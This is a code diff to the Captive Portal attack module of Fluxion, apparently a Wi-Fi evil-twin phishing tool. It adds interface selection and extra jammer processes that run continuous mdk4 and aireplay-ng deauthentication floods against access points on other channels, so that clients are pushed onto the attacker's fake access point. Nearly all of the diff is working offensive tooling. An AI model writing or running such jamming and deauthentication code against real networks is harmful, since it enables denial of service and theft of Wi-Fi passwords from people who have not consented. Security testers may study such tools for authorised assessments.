@@ -69,6 +69,148 @@ captive_portal_set_jammer_interface() {
   fi
 }
 
+CaptivePortalRelatedBSSIDJammers=()
+CaptivePortalRelatedBSSIDChannels=()
+CaptivePortalRelatedBSSIDMACs=()
+CaptivePortalRelatedBSSIDJammersOriginal=()
+CaptivePortalRelatedBSSIDJammerPIDs=()
+
+captive_portal_unset_related_bssid_jammers() {
+  local i
+  for i in "${!CaptivePortalRelatedBSSIDJammers[@]}"; do
+    local jammerIface="${CaptivePortalRelatedBSSIDJammers[$i]}"
+    if [ "$jammerIface" ]; then
+      fluxion_deallocate_interface "$jammerIface" 2>/dev/null
+    fi
+  done
+
+  CaptivePortalRelatedBSSIDJammers=()
+  CaptivePortalRelatedBSSIDJammersOriginal=()
+  CaptivePortalRelatedBSSIDChannels=()
+  CaptivePortalRelatedBSSIDMACs=()
+}
+
+captive_portal_available_jammer_interfaces() {
+  interface_list_wireless
+  local interface
+  for interface in "${InterfaceListWireless[@]}"; do
+    if [ "$interface" = "$CaptivePortalAccessPointInterface" ] || \
+       [ "$interface" = "$CaptivePortalAccessPointInterfaceOriginal" ] || \
+       [ "$interface" = "$CaptivePortalJammerInterface" ] || \
+       [ "$interface" = "$CaptivePortalJammerInterfaceOriginal" ]; then
+      continue
+    fi
+
+    local mappedInterface="${FluxionInterfaces[$interface]}"
+    if [ "$mappedInterface" = "$CaptivePortalAccessPointInterface" ] || \
+       [ "$mappedInterface" = "$CaptivePortalJammerInterface" ]; then
+      continue
+    fi
+
+    echo "$interface"
+  done
+  echo ""
+}
+
+captive_portal_set_related_bssid_jammers() {
+  if [ ${#FluxionTargetRelatedBSSIDs[@]} -eq 0 ]; then
+    return 0
+  fi
+
+  local otherChannelBSSIDs=()
+  local relatedItem
+  for relatedItem in "${FluxionTargetRelatedBSSIDs[@]}"; do
+    local relatedChannel="${relatedItem##*:}"
+    relatedChannel="${relatedChannel//[[:space:]]/}"
+    local targetChannelTrimmed="${FluxionTargetChannel//[[:space:]]/}"
+
+    if [ "$relatedChannel" != "$targetChannelTrimmed" ]; then
+      otherChannelBSSIDs+=("$relatedItem")
+    fi
+  done
+
+  if [ ${#otherChannelBSSIDs[@]} -eq 0 ]; then
+    echo -e "$FLUXIONVLine ${CGrn}All related BSSIDs are on channel $FluxionTargetChannel$CClr"
+    return 0
+  fi
+
+  declare -A channelBSSIDs
+  for relatedItem in "${otherChannelBSSIDs[@]}"; do
+    local relatedMAC="${relatedItem%:*}"
+    local relatedChannel="${relatedItem##*:}"
+    if [ -z "${channelBSSIDs[$relatedChannel]}" ]; then
+      channelBSSIDs[$relatedChannel]="$relatedMAC"
+    else
+      channelBSSIDs[$relatedChannel]="${channelBSSIDs[$relatedChannel]},$relatedMAC"
+    fi
+  done
+
+  echo
+  format_apply_autosize "$CWht%s, %-8b$CClr %-18b$CClr\n"
+  printf "$FormatApplyAutosize" \
+    "RELATED BSSID" \
+    "CHANNEL" \
+    "STATUS"
+
+  local channel
+  for channel in "${!channelBSSIDs[@]}"; do
+    local macs="${channelBSSIDs[$channel]}"
+    echo -e "${CYel}$macs${CClr} Channel ${CRed}$channel${CClr} - ${CYel}Needs separate deauth interface${CClr}"
+  done
+
+  echo
+  echo -e "$FLUXIONVLine ${CCyn}Related BSSIDs detected on ${#channelBSSIDs[@]} other channel(s)$CClr"
+  echo -e "$FLUXIONVLine ${CWht}Deauthing these will help ensure clients connect to your AP$CClr"
+  echo
+
+  CaptivePortalRelatedBSSIDJammersOriginal=()
+
+  for channel in "${!channelBSSIDs[@]}"; do
+    local macs="${channelBSSIDs[$channel]}"
+
+    echo
+    echo -e "$FLUXIONVLine ${CWht}Select interface for channel ${CCyn}$channel${CWht} (BSSIDs: ${CYel}$macs${CWht})$CClr"
+    echo -e "$FLUXIONVLine ${CYel}Note: Interfaces used for AP/main jammer are excluded$CClr"
+
+    if ! fluxion_get_interface captive_portal_available_jammer_interfaces \
+      "$(format center "$CWht[$CRed-$CWht]$CClr Select interface for channel $channel:"; echo)"; then
+      echo -e "$FLUXIONVLine ${CRed}Skipped channel $channel jammer$CClr"
+      continue
+    fi
+
+    local selectedInterface="$FluxionInterfaceSelected"
+    if [ -z "$selectedInterface" ]; then
+      echo -e "$FLUXIONVLine ${CYel}Skipped channel $channel jammer (no interface selected)$CClr"
+      continue
+    fi
+
+    if ! fluxion_allocate_interface "$selectedInterface"; then
+      echo -e "$FLUXIONVLine ${CRed}Failed to allocate interface for channel $channel$CClr"
+      continue
+    fi
+
+    local allocatedInterface="${FluxionInterfaces[$selectedInterface]}"
+    if [[ "$allocatedInterface" == flux* ]]; then
+      CaptivePortalRelatedBSSIDJammersOriginal+=("$selectedInterface")
+      CaptivePortalRelatedBSSIDJammers+=("$allocatedInterface")
+    else
+      CaptivePortalRelatedBSSIDJammersOriginal+=("$allocatedInterface")
+      CaptivePortalRelatedBSSIDJammers+=("$selectedInterface")
+    fi
+    CaptivePortalRelatedBSSIDChannels+=("$channel")
+    CaptivePortalRelatedBSSIDMACs+=("$macs")
+
+    local monitorIface="${CaptivePortalRelatedBSSIDJammers[-1]}"
+    echo -e "$FLUXIONVLine ${CGrn}Interface $monitorIface allocated for channel $channel$CClr"
+  done
+
+  if [ ${#CaptivePortalRelatedBSSIDJammers[@]} -gt 0 ]; then
+    echo -e "$FLUXIONVLine ${CGrn}Configured ${#CaptivePortalRelatedBSSIDJammers[@]} additional jammer interface(s)$CClr"
+  fi
+
+  return 0
+}
+
 captive_portal_ap_interfaces() {
   interface_list_wireless
   local interface
@@ -665,7 +807,7 @@ captive_portal_set_attack() {
   for authenticatorFile in "${authenticatorFiles[@]}"; do
     cp "$FLUXIONPath/attacks/Captive Portal/lib/$authenticatorFile" \
       "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
-    sed -i -e 's/\$FLUXIONWorkspacePath/'"${FLUXIONWorkspacePath//\//\\\/}"'/g' \
+    sed -i -e 's|__FLUXION_WORKSPACE_PATH__|'"${FLUXIONWorkspacePath//|/\\|}"'|g' \
       "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
     chmod u+x "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
   done
@@ -728,7 +870,7 @@ fastcgi.server = (
     \".php\" => (
         (
             \"bin-path\" => \"/usr/bin/php-cgi\",
-            \"socket\" => \"/tmp/fluxspace/php.socket\"
+            \"socket\" => \"$FLUXIONWorkspacePath/php.socket\"
         )
     )
 )
@@ -1343,6 +1485,7 @@ unprep_attack() {
   captive_portal_unset_authenticator
   captive_portal_unset_ap_interface
   captive_portal_unset_jammer_interface
+  captive_portal_unset_related_bssid_jammers
 
   # Always return success to allow tracker channel change handling to continue
   return 0
@@ -1363,6 +1506,8 @@ prep_attack() {
   if ! fluxion_do_sequence captive_portal sequence[@]; then
     return 1
   fi
+
+  captive_portal_set_related_bssid_jammers
 
   CaptivePortalState="Ready"
 }
@@ -1387,7 +1532,7 @@ load_attack() {
   # Target hash information for verification.
   local -r targetHashSSID=${configuration[8]}
   local -r targetHashMAC=${configuration[9]}
-  
+
   # Captive portal jammer type.
   CaptivePortalJammerType=${configuration[10]}
   option_deauth="${CaptivePortalJammerType}"
@@ -1420,7 +1565,7 @@ save_attack() {
   # Target to verify validity of hash on restore.
   echo "$FluxionTargetSSID" >> "$configurationPath"
   echo "$FluxionTargetMAC" >> "$configurationPath"
-  
+
   # Captive portal jammer type.
   CaptivePortalJammerType="${option_deauth}"
   echo "$CaptivePortalJammerType" >> "$configurationPath"
@@ -1431,7 +1576,17 @@ captive_portal_stop_jammer_service() {
     fluxion_kill_lineage $CaptivePortalJammerServiceXtermPID
     CaptivePortalJammerServiceXtermPID=""
   fi
+
+  if [ ${#CaptivePortalRelatedBSSIDJammerPIDs[@]} -gt 0 ]; then
+    local pid
+    for pid in "${CaptivePortalRelatedBSSIDJammerPIDs[@]}"; do
+      fluxion_kill_lineage $pid
+    done
+    CaptivePortalRelatedBSSIDJammerPIDs=()
+  fi
+
   sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
+  rm -f "$FLUXIONWorkspacePath"/mdk4_blacklist_ch*.lst
 }
 
 captive_portal_start_jammer_service() {
@@ -1454,6 +1609,39 @@ captive_portal_start_jammer_service() {
     fluxion_window_open CaptivePortalJammerServiceXtermPID \
       "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
       "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface"
+  fi
+
+  CaptivePortalRelatedBSSIDJammerPIDs=()
+  if [ ${#CaptivePortalRelatedBSSIDJammers[@]} -gt 0 ]; then
+    echo -e "$FLUXIONVLine Starting additional jammers for related BSSIDs..."
+    local i
+    for i in "${!CaptivePortalRelatedBSSIDJammers[@]}"; do
+      local jammerIface="${CaptivePortalRelatedBSSIDJammers[$i]}"
+      local jammerChannel="${CaptivePortalRelatedBSSIDChannels[$i]}"
+      local jammerMACs="${CaptivePortalRelatedBSSIDMACs[$i]}"
+      local blacklistFile="$FLUXIONWorkspacePath/mdk4_blacklist_ch${jammerChannel}.lst"
+
+      echo "$jammerMACs" | tr ',' '\n' > "$blacklistFile"
+
+      if [[ $option_deauth -eq 1 ]]; then
+        xterm $FLUXIONHoldXterm -bg black -fg "#FF6600" \
+          -title "FLUXION Jammer CH$jammerChannel [$FluxionTargetSSID]" -e \
+          "mdk4 $jammerIface d -c $jammerChannel -b \"$blacklistFile\"" &
+        CaptivePortalRelatedBSSIDJammerPIDs+=($!)
+      elif [[ $option_deauth -eq 2 ]]; then
+        local mac
+        for mac in $(echo "$jammerMACs" | tr ',' ' '); do
+          xterm $FLUXIONHoldXterm -bg black -fg "#FF6600" \
+            -title "FLUXION Jammer CH$jammerChannel [$mac]" -e \
+            "aireplay-ng -0 0 -a $mac --ignore-negative-one $jammerIface" &
+          CaptivePortalRelatedBSSIDJammerPIDs+=($!)
+        done
+      fi
+
+      echo "Related BSSID Jammer (CH$jammerChannel): ${CaptivePortalRelatedBSSIDJammerPIDs[-1]}" \
+        >> $FLUXIONOutputDevice
+    done
+    echo -e "$FLUXIONVLine ${CGrn}Started ${#CaptivePortalRelatedBSSIDJammerPIDs[@]} additional jammer(s)$CClr"
   fi
 }
 
@@ -1505,7 +1693,7 @@ stop_attack() {
       kill $CaptivePortalAuthenticatorServiceXtermPID &> /dev/null
       CaptivePortalAuthenticatorServiceXtermPID=""
     fi
-    
+
     fluxion_kill_lineage "--signal SIGABRT" \
       "captive_portal_authenticator\\.sh" &> /dev/null
     pkill -9 -f "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" \
